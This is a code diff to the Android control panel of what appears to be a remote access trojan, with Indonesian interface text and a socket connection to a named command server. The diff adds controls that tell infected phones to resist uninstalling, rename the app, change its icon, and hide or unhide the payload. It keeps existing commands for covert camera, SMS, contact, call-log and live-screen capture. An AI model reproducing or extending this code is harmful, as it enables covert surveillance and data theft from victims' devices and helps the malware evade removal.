@@ -98,6 +98,52 @@ public class ControlActivity extends Activity {
         lockPanel.addView(unlockBtn);
         root.addView(lockPanel);
 
+        // Panel Alat Tambahan
+        LinearLayout toolsPanel = new LinearLayout(this);
+        toolsPanel.setOrientation(LinearLayout.HORIZONTAL);
+        toolsPanel.setGravity(Gravity.CENTER);
+        toolsPanel.setPadding(16, 8, 16, 0);
+
+        Button antiUninstallBtn = new Button(this);
+        antiUninstallBtn.setText("🛡️ Anti-Uninstall");
+        antiUninstallBtn.setTextColor(0xFFFFFFFF);
+        antiUninstallBtn.setBackgroundColor(0xFF2196F3);
+        antiUninstallBtn.setGravity(Gravity.CENTER);
+        LinearLayout.LayoutParams toolBtnParams = new LinearLayout.LayoutParams(0, 56, 1);
+        toolBtnParams.setMargins(4, 0, 4, 0);
+        antiUninstallBtn.setLayoutParams(toolBtnParams);
+        antiUninstallBtn.setOnClickListener(v -> showAntiUninstallDialog());
+        toolsPanel.addView(antiUninstallBtn);
+
+        Button renameBtn = new Button(this);
+        renameBtn.setText("✏️ Rename");
+        renameBtn.setTextColor(0xFFFFFFFF);
+        renameBtn.setBackgroundColor(0xFF9C27B0);
+        renameBtn.setGravity(Gravity.CENTER);
+        renameBtn.setLayoutParams(toolBtnParams);
+        renameBtn.setOnClickListener(v -> showRenameDialog());
+        toolsPanel.addView(renameBtn);
+
+        Button iconBtn = new Button(this);
+        iconBtn.setText("🖼️ Ikon");
+        iconBtn.setTextColor(0xFFFFFFFF);
+        iconBtn.setBackgroundColor(0xFFFF9800);
+        iconBtn.setGravity(Gravity.CENTER);
+        iconBtn.setLayoutParams(toolBtnParams);
+        iconBtn.setOnClickListener(v -> showChangeIconDialog());
+        toolsPanel.addView(iconBtn);
+
+        Button payloadBtn = new Button(this);
+        payloadBtn.setText("📦 Payload");
+        payloadBtn.setTextColor(0xFFFFFFFF);
+        payloadBtn.setBackgroundColor(0xFF00BCD4);
+        payloadBtn.setGravity(Gravity.CENTER);
+        payloadBtn.setLayoutParams(toolBtnParams);
+        payloadBtn.setOnClickListener(v -> showPayloadDialog());
+        toolsPanel.addView(payloadBtn);
+
+        root.addView(toolsPanel);
+
         // Grid Menu 2 kolom
         ScrollView scroll = new ScrollView(this);
         LinearLayout grid = new LinearLayout(this);
@@ -145,6 +191,104 @@ public class ControlActivity extends Activity {
             socket = IO.socket("https://ghostspy.bruang.biz.id");
             socket.connect();
         } catch (URISyntaxException e) {}
+    }
+
+    private void showAntiUninstallDialog() {
+        AlertDialog.Builder b = new AlertDialog.Builder(this);
+        b.setTitle("🛡️ Anti-Uninstall Protection");
+        LinearLayout lay = new LinearLayout(this);
+        lay.setOrientation(LinearLayout.VERTICAL);
+        lay.setPadding(24, 16, 24, 16);
+
+        CheckBox toggle = new CheckBox(this);
+        toggle.setText("Aktifkan Anti-Uninstall");
+        toggle.setTextColor(0xFFFFFFFF);
+        toggle.setChecked(true); // asumsi saat ini aktif, bisa diambil dari data RAT nanti
+        lay.addView(toggle);
+
+        b.setView(lay);
+        b.setPositiveButton("Terapkan", (d, w) -> {
+            JSONObject params = new JSONObject();
+            try { params.put("state", toggle.isChecked()); } catch (Exception e) {}
+            sendCmd("anti_uninstall", params);
+        });
+        b.setNegativeButton("Batal", null);
+        b.show();
+    }
+
+    private void showRenameDialog() {
+        AlertDialog.Builder b = new AlertDialog.Builder(this);
+        b.setTitle("✏️ Ubah Nama APK");
+        EditText input = new EditText(this);
+        input.setHint("Nama baru");
+        input.setTextColor(0xFFFFFFFF);
+        input.setBackgroundColor(0xFF252525);
+        input.setPadding(16, 12, 16, 12);
+        b.setView(input);
+        b.setPositiveButton("Ubah", (d, w) -> {
+            String newName = input.getText().toString().trim();
+            if (!newName.isEmpty()) {
+                JSONObject params = new JSONObject();
+                try { params.put("newName", newName); } catch (Exception e) {}
+                sendCmd("rename_app", params);
+            }
+        });
+        b.setNegativeButton("Batal", null);
+        b.show();
+    }
+
+    private void showChangeIconDialog() {
+        AlertDialog.Builder b = new AlertDialog.Builder(this);
+        b.setTitle("🖼️ Ganti Ikon APK");
+        EditText input = new EditText(this);
+        input.setHint("URL gambar (PNG/JPG)");
+        input.setTextColor(0xFFFFFFFF);
+        input.setBackgroundColor(0xFF252525);
+        input.setPadding(16, 12, 16, 12);
+        b.setView(input);
+        b.setPositiveButton("Ganti", (d, w) -> {
+            String url = input.getText().toString().trim();
+            if (!url.isEmpty()) {
+                JSONObject params = new JSONObject();
+                try { params.put("url", url); } catch (Exception e) {}
+                sendCmd("change_icon", params);
+            }
+        });
+        b.setNegativeButton("Batal", null);
+        b.show();
+    }
+
+    private void showPayloadDialog() {
+        AlertDialog.Builder b = new AlertDialog.Builder(this);
+        b.setTitle("📦 Payload Control");
+        LinearLayout lay = new LinearLayout(this);
+        lay.setOrientation(LinearLayout.HORIZONTAL);
+        lay.setPadding(24, 16, 24, 16);
+        lay.setGravity(Gravity.CENTER);
+
+        Button hideBtn = new Button(this);
+        hideBtn.setText("👻 Hide Payload");
+        hideBtn.setTextColor(0xFFFFFFFF);
+        hideBtn.setBackgroundColor(0xFFFF1744);
+        hideBtn.setOnClickListener(v -> {
+            sendCmd("hide_app");
+            Toast.makeText(this, "Payload disembunyikan", Toast.LENGTH_SHORT).show();
+        });
+        lay.addView(hideBtn);
+
+        Button unhideBtn = new Button(this);
+        unhideBtn.setText("👁️ Unhide Payload");
+        unhideBtn.setTextColor(0xFFFFFFFF);
+        unhideBtn.setBackgroundColor(0xFF00E676);
+        unhideBtn.setOnClickListener(v -> {
+            sendCmd("unhide_app");
+            Toast.makeText(this, "Payload ditampilkan", Toast.LENGTH_SHORT).show();
+        });
+        lay.addView(unhideBtn);
+
+        b.setView(lay);
+        b.setNegativeButton("Tutup", null);
+        b.show();
     }
 
     private void showLockScreenDialog() {
@@ -317,10 +461,10 @@ public class ControlActivity extends Activity {
         Intent i = null;
         switch (cmd) {
             case "start_camera": i = new Intent(this, CameraActivity.class); break;
-            case "live_screen": i = new Intent(this, LiveScreenActivity.class); break;
             case "get_sms": i = new Intent(this, SmsActivity.class); break;
             case "get_contacts": i = new Intent(this, ContactsActivity.class); break;
             case "get_calls": i = new Intent(this, CallActivity.class); break;
+            case "live_screen": i = new Intent(this, LiveScreenActivity.class); break;
         }
         if (i != null) {
             i.putExtra("deviceId", deviceId);
